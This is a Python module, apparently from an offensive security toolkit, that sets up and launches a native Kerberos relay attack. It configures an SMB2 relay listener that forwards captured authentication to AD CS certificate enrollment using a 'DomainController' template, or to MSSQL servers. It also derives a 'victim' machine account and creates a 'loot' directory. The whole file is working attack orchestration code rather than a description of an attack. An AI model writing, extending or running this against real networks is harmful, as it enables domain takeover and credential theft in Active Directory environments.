# -*- coding: utf-8 -*-
"""Native Kerberos relay orchestration (no impacket)."""

from __future__ import annotations

import os
from typing import Optional
from urllib.parse import urlparse

from lib.protocols.smb.smb2_krb_relay_server import NativeRelayConfig, start_native_smb2_relay_server
from lib.protocols.smb.smb_transport import PYSMB_AVAILABLE


def pysmb_available() -> bool:
    return PYSMB_AVAILABLE


def native_relay_available(relay_target: str) -> bool:
    relay = (relay_target or "").lower()
    return "certsrv" in relay or relay.startswith("mssql://")


def build_native_relay_config(
    relay_target: str,
    listener_ip: str,
    lootdir: str = ".",
    adcs_template: str = "DomainController",
    mssql_queries: Optional[list] = None,
    port: int = 445,
) -> NativeRelayConfig:
    hostname = urlparse(relay_target).hostname or ""
    if not hostname:
        raise ValueError(f"invalid relay target URL: {relay_target}")
    os.makedirs(lootdir or ".", exist_ok=True)
    victim = hostname.split(".")[0].upper() + "$"
    return NativeRelayConfig(
        interface_ip=listener_ip,
        relay_target=relay_target,
        lootdir=lootdir,
        adcs_template=adcs_template,
        mssql_queries=list(mssql_queries or []),
        victim=victim,
        port=port,
    )


def start_native_relay(config: NativeRelayConfig):
    return start_native_smb2_relay_server(config)
